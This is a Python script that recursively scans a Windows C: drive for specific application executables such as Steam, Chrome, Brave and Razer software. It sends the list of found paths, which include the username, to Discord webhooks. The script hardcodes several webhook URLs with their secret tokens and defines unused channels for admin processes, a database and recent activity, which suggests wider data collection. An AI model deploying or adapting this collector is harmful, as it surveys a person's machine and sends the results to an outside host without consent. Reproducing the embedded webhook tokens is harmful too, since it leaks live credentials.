import os
import subprocess
import requests
import json
import time
import platform
import getpass
import tempfile
from datetime import datetime

# Webhook URLs
WEBHOOK_URLS = {
    'system_processes': 'https://canary.discord.com/api/webhooks/1279137428371931248/eYRZf4HRZ5GmYXgLI_iRA5WiOhqVSFBDGn_ztg-oRrNrSWmdKq69WC0MX9P9nQuutQac',
    'admin_processes': 'https://canary.discord.com/api/webhooks/1279137428371931248/eYRZf4HRZ5GmYXgLI_iRA5WiOhqVSFBDGn_ztg-oRrNrSWmdKq69WC0MX9P9nQuutQac',
    'process_traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
    'database': 'https://canary.discord.com/api/webhooks/1279407337618145310/A7fONuJnsWJLLCwkB2XlNKga0XeQwO6yq3HjWzhHt6hqzafunlxxeIO_dpebSN_DcunP',
    'recent_activity': 'https://canary.discord.com/api/webhooks/1279411390314057820/85pPrwRUCeX3EoLCexlHK0LOyAf9m9pRmRO3GIgZZMhMdm_gxAbMLWSE_0T6MXNhiWgK',
    'error': 'https://canary.discord.com/api/webhooks/1279188293438799902/S3ejH4YpQBv-7Yp4TfW8LCezK-UpzVxolIwdcX66uN-DQZ2DiXt-X2QdeL2mM9ky5Siz'
}

# Webhook delay (in seconds)
WEBHOOK_DELAY = 1

def send_embed_to_webhook(title, description, color, url):
    """Send a message to the webhook with an embedded format."""
    max_description_length = 2000
    descriptions = [description[i:i+max_description_length] for i in range(0, len(description), max_description_length)]

    for desc in descriptions:
        embed = {
            "embeds": [
                {
                    "title": title,
                    "description": desc,
                    "color": color
                }
            ]
        }
        try:
            response = requests.post(url, json=embed)
            response.raise_for_status()
            print_status(f"Embed sent to webhook: {title}", 'success')
        except requests.RequestException as e:
            print_status(f"Failed to send embed to webhook: {e}", 'error')
        
        time.sleep(WEBHOOK_DELAY)  # Ensure delay between webhook requests

def print_status(message, status='normal'):
    """Print status messages with color coding for real-time feedback."""
    color_code = {
        'error': '91',     # Red
        'warning': '93',   # Yellow
        'success': '92',   # Green
        'normal': '0'      # Default
    }
    print(f"\033[{color_code[status]}m{message}\033[0m")

def write_log(log_path, message):
    """Write messages to a log file."""
    with open(log_path, 'a') as log_file:
        log_file.write(message + "\n")

def run_command(command):
    """Execute a command and return its output or an error message."""
    try:
        result = subprocess.check_output(command, shell=True, text=True).strip()
        return result, None
    except subprocess.CalledProcessError as e:
        return None, str(e)

def scan_directory(directory, file_names=None):
    """Recursively scan a directory for specific files."""
    results = {file: [] for file in file_names} if file_names else []
    total_files = 0
    scanned_files = 0
    directories_to_scan = [directory]

    while directories_to_scan:
        current_dir = directories_to_scan.pop()
        if not os.path.exists(current_dir):
            print_status(f"Directory does not exist: {current_dir}", 'error')
            continue
        
        try:
            with os.scandir(current_dir) as it:
                for entry in it:
                    if entry.is_dir(follow_symlinks=False):
                        directories_to_scan.append(entry.path)
                    elif file_names:
                        for file in file_names:
                            if file.lower() in entry.name.lower():
                                path = entry.path
                                results[file].append(path)
                                write_log(log_file, f"Found file: {path}")
                                print_status(f"Found file: {path}", 'warning')
                    scanned_files += 1
                    total_files += 1
            # Print status for directory completion
            if not results:
                print_status(f"Directory clear: {current_dir}", 'success')
            else:
                print_status(f"Directory scanned: {current_dir}", 'normal')
        except PermissionError:
            write_log(log_file, f"Permission denied: {current_dir}")
            print_status(f"Permission denied: {current_dir}", 'error')
            continue

    return results, total_files, scanned_files

def find_process_traces(name):
    """Find all traces of the specific process."""
    traces = []
    directories = [
        'C:\\Windows\\System32',
        'C:\\Program Files',
        'C:\\Program Files (x86)',
        'C:\\Users\\Public',
        'C:\\Windows\\Temp',
        'C:\\Users\\%USERNAME%\\AppData\\Local',
        'C:\\Users\\%USERNAME%\\AppData\\Roaming',
        'C:\\$Recycle.Bin',
        'C:\\ProgramData',
        'C:\\Documents and Settings',
        'C:\\$Windows.~BT'
    ]

    # Scan specified directories
    for directory in directories:
        directory = directory.replace('%USERNAME%', getpass.getuser())
        if os.path.exists(directory):
            write_log(log_file, f"Scanning directory: {directory}")
            print_status(f"Scanning directory: {directory}", 'normal')
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if name.lower() in file.lower():
                        path = os.path.join(root, file)
                        traces.append(path)
                        write_log(log_file, f"Found trace: {path}")
                        print_status(f"Found trace: {path}", 'warning')

    return traces

def main():
    global log_file
    log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
    print_status("Starting script...", 'normal')

    specific_files = [
        'steam.exe',
        'Spotify.exe',
        'RazerCortex.exe',
        'RazerSynapse.exe',
        'lghub.exe',
        'chrome.exe',
        'TikTokLIVEStudio.exe',
        'voicemeeterpro.exe',
        'brave.exe'
    ]

    # Scan PC for specific files
    scan_results = {}
    for file_name in specific_files:
        file_results, _, _ = scan_directory('C:\\', [file_name])
        scan_results[file_name] = file_results[file_name]
        if file_results:
            print_status(f"File scan complete: {file_name}", 'success')
        else:
            print_status(f"No traces found for file: {file_name}", 'success')

    send_embed_to_webhook(
        "PC Scan Results",
        f"Scan completed for specific files:\n{json.dumps(scan_results, indent=2)}",
        0xFF00FF,  # Magenta color
        WEBHOOK_URLS['process_traces']
    )
    print_status("Scan results sent to webhook.", 'success')

if __name__ == "__main__":
    main()
